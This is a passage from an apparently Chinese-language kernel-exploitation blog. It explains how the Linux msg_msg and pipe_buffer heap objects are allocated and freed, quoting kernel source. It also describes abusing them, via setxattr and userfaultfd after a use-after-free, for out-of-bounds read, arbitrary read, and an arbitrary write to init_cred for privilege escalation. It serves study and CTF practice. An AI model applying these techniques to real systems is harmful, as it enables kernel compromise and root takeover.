out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面是unlink的部分,如果msg_msg结构被修改了可能会出错的</span></span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line">msq-&gt;q_qnum--;</span><br><span class="line">msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br></pre></td></tr></table></div></figure>

<p>使用这个标志位还需要在内核编译的时候设置<code>CONFIG_CHECKPOINT_RESTORE=y</code>才行，否则还是会出错的</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//正常的一些数据复制</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">//如果没有设置CONFIG_CHECKPOINT_RESTORE=y则会出错</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(-ENOSYS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>🔺注：还有一点不知道是不是什么bug，在某些内核版本中，至少我的<code>v5.11</code>中，<code>MSG_NOERROR</code>和<code>MSG_COPY</code>（后续会讲到）没有办法同时生效，关键点在于<code>copy_msg()</code>函数中，转化成汇编如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png" alt="image-20220512163536660"></p>
<p>注意到红框的部分，获取<code>rdi(msg)</code>和<code>rsi(copy)</code>对应的<code>m_ts</code>进行比较，而<code>copy</code>的<code>m_ts</code>是从用户传进来的想要获取消息的长度，如果小于实际的<code>msg</code>的<code>m_ts</code>长度，那就标记错误然后退出。可以这个比较应该是在后面才会进行的，但是这里也突然冒出来，就很奇怪，导致这两个标志位没办法同时发挥作用。</p>

        <h5 id="B-释放堆块的消息读取"   >
          <a href="#B-释放堆块的消息读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-释放堆块的消息读取" class="headerlink" title="B.释放堆块的消息读取"></a>B.释放堆块的消息读取</h5>
      <p>同理如果不指定<code>MSG_COPY</code>这个标志时，从消息队列中读取消息就会触发内存释放，这里就可以依据发送消息时设置的<code>mtype</code>和接收消息时设置的<code>msgtpy</code>来进行消息队列中各个位置的堆块的释放。</p>

        <h5 id="C-数据复制"   >
          <a href="#C-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-数据复制" class="headerlink" title="C.数据复制"></a>C.数据复制</h5>
      <p>不管什么标志位，只要不是<code>MSG_NOERROR</code>和<code>MSG_COPY</code>联合起来，并且申请读取消息长度<code>size</code>小于通过<code>find_msg()</code>函数获取到的实际消息的<code>m_ts</code>，那么最终都会走到do_msgrcv()函数的末尾，通过如下代码进行数据复制和堆块释放</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-利用"   >
          <a href="#3-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用" class="headerlink" title="(3)利用"></a>(3)利用</h3>
      
        <h4 id="越界读取"   >
          <a href="#越界读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#越界读取" class="headerlink" title="越界读取"></a>越界读取</h4>
      <p>这样，当我们通过之前提到的<code>double-free/UAF</code>，并且再使用<code>setxattr</code>来对<code>msg_msgmsg</code>中的<code>m_ts</code>进行修改，这样在我们调用<code>msgrcv</code>的时候就能越界从堆上读取内存了，就可能能够泄露到堆地址或者程序基地址。</p>
<p><strong>使用<code>setxattr</code>的时候需要注意释放堆块时FD的位置，不同内核版本开启不同保护下FD的位置不太一样</strong></p>
<p>为了获取到地址的成功性更大，我们就需要用到单个<code>msg_queue</code>和单个<code>msg_msg</code>的内存模型</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png" alt="image-20220511113542467"></p>
<p>可以看到单个<code>msg_msg</code>在<code>msg_queue</code>的管理下形成双向循环链表，所以如果我们通过<code>msgget</code>和<code>msgsnd</code>多申请一些相同大小的且只有一个<code>msg_msg</code>结构体的<code>msg_queue</code>，那么越界读取的时候，就可以读取到只有单个<code>msg_msg</code>的头部了</p>
<p>而单个<code>msg_msg</code>由于双向循环链表，其头部中又存在指向<code>msg_queue</code>的指针，那么这样就能泄露出<code>msg_queue</code>的堆地址了。</p>

        <h4 id="任意读取"   >
          <a href="#任意读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#任意读取" class="headerlink" title="任意读取"></a>任意读取</h4>
      <p>完成上述泄露<code>msg_queue</code>的堆地址之后，就需要用到<code>msg_msg</code>的内存布局了</p>
<p>由于我们的<code>msg_msg</code>消息的内存布局如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png" alt="5IcVxRaFQtg3HCW"></p>
<p>相关读取源码如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.9----ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">store_msg</span><span class="params">(<span class="keyword">void</span> __user *dest, struct msg_msg *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="keyword">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>所以如果我们可以修改<code>next</code>指针和<code>m_ts</code>，结合读取<code>msg</code>最终调用函数<code>store_msg</code>的源码，那么就能够实现任意读取。</p>
<p>那么接着上面的，我们得到<code>msg_queue</code>之后，可以再将<code>msg_msg</code>的next指针指回<code>msg_queue</code>，读出其中的<code>msg_msg</code>，就能获得当前可控堆块的堆地址。</p>
<p>这样完成之后，我们结合<code>userfaultfd</code>和<code>setxattr</code>频繁修改next指针就能基于当前堆地址来进行内存搜索了，从而能够完成地址泄露。</p>
<p>同时需要注意的是，判断链表是否结束的依据为next是否为null，所以我们任意读取的时候，最好找到一个地方的next指针处的值为null。</p>

        <h4 id="任意写"   >
          <a href="#任意写" class="heading-link"><i class="fas fa-link"></i></a><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h4>
      <p>同样的，<code>msg_msg</code>由于next指针的存在，结合<code>msgsnd</code>也具备任意地址写的功能。我们可以在拷贝的时候利用<code>userfaultfd</code>停下来，然后更改next指针，使其指向我们需要的地方，比如<code>init_cred</code>结构体位置，从而直接修改进行提权。</p>

        <h2 id="2-pipe管道—kmalloc-1024-kmalloc-192"   >
          <a href="#2-pipe管道—kmalloc-1024-kmalloc-192" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-pipe管道—kmalloc-1024-kmalloc-192" class="headerlink" title="2.pipe管道—kmalloc-1024/kmalloc-192"></a>2.pipe管道—kmalloc-1024/kmalloc-192</h2>
      <p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/116270704" >(31条消息) Linux系统调用：pipe()系统调用源码分析_rtoax的博客-CSDN博客_linux pipe 源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>****</p>
<p>通常来讲，管道用来在父进程和子进程之间通信，因为<code>fork</code>出来的子进程会继承父进程的文件描述符副本。这里就使用当前进程来创建管道符，从管道的读取端(<code>pipe_fd[0]</code>)和写入端(<code>pipe_fd[1]</code>)来进行利用。</p>

        <h3 id="1-使用方法-1"   >
          <a href="#1-使用方法-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法-1" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建-2"   >
          <a href="#①创建-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-2" class="headerlink" title="①创建"></a>①创建</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用pipe或者pipe2</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipe_fd);<span class="comment">//默认阻塞状态</span></span><br><span class="line"><span class="comment">//pipe2(pipe_fd,flag);</span></span><br></pre></td></tr></table></div></figure>

<p>其中<code>pipe2</code>函数或者系统调用<code>__NR_pipe2</code>的<code>flag</code>支持除0之外的三种模式，可用在<code>man</code>手册中查看。</p>
<p>如果传入的<code>flag</code>为0，则和<code>pipe</code>函数是一样的，是阻塞的。</p>
<p>阻塞状态：即当没有数据在管道中时，如果还调用<code>read</code>从管道读取数据，那么就会使得程序处于阻塞状态，其他的也是类似的情况。</p>
<p>会默认创建两个fd文件描述符的，该fd文件描述符效果的相关结构如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>放入到<code>pipe_fd</code>中，如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[0]:%d\n&quot;</span>,pipe_fd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[1]:%d\n&quot;</span>,pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>效果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png" alt="image-20220509161948796"></p>
<p>之后使用<code>write/read</code>来写入读取即可，注意写入端为<code>fd[1]</code>，读取端为<code>fd[0]</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(pipe_fd[<span class="number">1</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(pipe_fd[<span class="number">0</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-1"   >
          <a href="#②释放-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-1" class="headerlink" title="②释放"></a>②释放</h4>
      <p>由于<code>pipe</code>管道创建后会对应创建文件描述符，所以释放两端对应的文件描述符即可释放管道<code>pipe</code>管道</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>需要将两个文件描述符fd都给释放掉或者使用<code>read</code>将管道中所有数据都读取出来，才会进入<code>free_pipe_info</code>函数来释放在线性映射区域申请的相关内存资源，否则还是不会进入的。</p>

        <h3 id="2-内存分配与释放-1"   >
          <a href="#2-内存分配与释放-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放-1" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      
        <h4 id="①分配"   >
          <a href="#①分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#①分配" class="headerlink" title="①分配"></a>①分配</h4>
      <p>发生在调用<code>pipe</code>/<code>pipe2</code>函数，或者系统调用<code>__NR_pipe</code>/<code>__NR_pipe2</code>时，内核入口为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) <span class="comment">/* pipe() 系统调用 */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>函数调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()-&gt;__do_pipe_flags()-&gt;create_pipe_files()-&gt;get_pipe_inode()-&gt;alloc_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>调用之后会在内核的线性映射区域进行内存分配，也就是常见的内核堆管理的区域。分配点在如下函数中：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//#define PIPE_DEF_BUFFERS	16</span></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//pipe_inode_info管理结构，大小为0xa0，属于kmalloc-192</span></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//相关的消息结构为pipe_buffer数组,总共16*0x28=0x280,直接从kmalloc-1024中拿取堆块</span></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">	<span class="comment">//对申请的pipe管道进行一些初始化</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//出错的话则会释放掉，具体干啥的不太清楚</span></span><br><span class="line">out_free_uid:</span><br><span class="line">	free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>相关的<code>pipe_inode_info</code>结构如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;<span class="comment">//文件描述符计数，都为0时才会释放管道</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="comment">//pipe_buffer数组,16个,每个大小为0xa0,通常我们从这上面泄露地址或者劫持程序流</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-2"   >
          <a href="#②释放-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-2" class="headerlink" title="②释放"></a>②释放</h4>
      <p>直接使用<code>close</code>函数释放管道相关的文件描述符fd两端。</p>
<p>函数链调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()-&gt;put_pipe_info()-&gt;free_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>需要注意的时，在<code>put_pipe_info</code>函数中</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_pipe_info</span><span class="params">(struct inode *inode, struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line">	<span class="keyword">if</span> (!--pipe-&gt;files) &#123;</span><br><span class="line">		inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">		kill = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当files为0才会进入该函数</span></span><br><span class="line">	<span class="keyword">if</span> (kill)</span><br><span class="line">		free_pipe_info(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>只有<code>pipe_inode_info</code>这个管理结构中的<code>files</code>成员为0，才会进行释放，也就是管道两端都关闭掉才行。</p>
<p>相关释放函数<code>free_pipe_info</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pipe_info</span><span class="params">(struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//和管道相关的释放有关，也是相关的漏洞点</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//释放pipe_buffer数组,kmalloc-1024</span></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">    <span class="comment">//释放pipe_inode_info管理结构,kmalloc-192</span></span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-利用-1"   >
          <a href="#3-利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用-1" class="headerlink" title="(3)利用"></a>(3)利用</h3>
      
        <h4 id="①信息泄露"   >
          <a href="#①信息泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#①信息泄露" class="headerlink" title="①信息泄露"></a>①信息泄露</h4>
      <p><code>pipe_buffer</code>结构的<code>buf</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span 